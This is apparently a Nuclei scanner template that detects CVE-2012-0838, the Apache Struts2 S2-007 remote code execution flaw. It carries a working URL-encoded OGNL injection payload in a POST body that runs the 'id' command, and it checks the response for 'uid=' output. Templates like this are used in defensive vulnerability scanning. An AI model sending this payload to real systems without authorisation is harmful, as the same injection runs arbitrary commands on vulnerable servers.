id: CVE-2012-0838

info:
  name: Apache Struts2 S2-007 RCE
  author: pikpikcu
  severity: critical
  reference: https://blog.csdn.net/weixin_43416469/article/details/113849942
  tags: cve,cve2012,apache,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/user.action"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
        name=tes&email=tes&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "uid=*"
        condition: and

      - type: status
        status:
          - 200
